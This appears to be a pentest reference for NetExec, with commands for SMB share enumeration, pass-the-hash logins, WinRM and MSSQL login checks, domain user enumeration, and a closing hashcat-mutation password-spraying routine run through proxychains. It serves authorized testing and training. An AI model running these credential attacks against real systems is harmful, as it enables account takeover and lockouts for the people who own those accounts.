## Separate domain authentication from share enumeration

**Run in:** Kali. **Requires:** SMB reachability and a known domain identity; use local-auth only for a local-account test.

```bash
nxc smb TARGET_IP -d DOMAIN_FQDN -u USER -p 'PASSWORD' --shares
```

**What the result establishes:** Interpret results per protocol, host and identity; authentication, share permissions and command-execution checks are different milestones.

**Next check:** Verify one share path as this identity, then test WinRM or SQL independently if those services are relevant.

## Commands

**Kali**

```bash
nxc smb TARGET_IP -u USER -p 'PASSWORD' --shares
nxc smb TARGET_IP -u USER -H NT_HASH
nxc winrm TARGET_IP -u USER -p 'PASSWORD'
nxc mssql TARGET_IP -u USER -p 'PASSWORD'
```

## Common authentication & directory flags

**Kali**

```bash
nxc smb DC_IP -d DOMAIN_FQDN -u USER -p 'PASSWORD' --users --pass-pol
nxc smb TARGET_IP -u USER -p 'PASSWORD' --local-auth
nxc ldap DC_IP -d DOMAIN_FQDN -u USER -k --use-kcache
```

Use --local-auth for local accounts, -k --use-kcache for Kerberos tickets, and --continue-on-success when testing authorized user lists.

## If it fails

| Symptom | Check |
| --- | --- |
| A successful login does not permit a share or another protocol | Choose domain versus local authentication explicitly and distinguish NT hashes from captured NetNTLM challenge/response material. |

```bash
hashcat --stdout base.txt -r /usr/share/hashcat/rules/best64.rule | sort -u > muts.txt
# tight hand-list when lockout is a risk:
printf '%s\n' fails-nibble-disturb5 fails-nibble-disturb6 Fails-nibble-disturb4 \
  fails-nibble-disturb4! fails-nibble-disturb5! fails-nibble-disturb2025 fails-nibble-disturb2026 >> muts.txt
# 3. spray the mutations (CAREFULLY — see lockout below)
proxychains nxc smb <DC> -u <user> -p muts.txt --continue-on-success | grep '[+]'
```
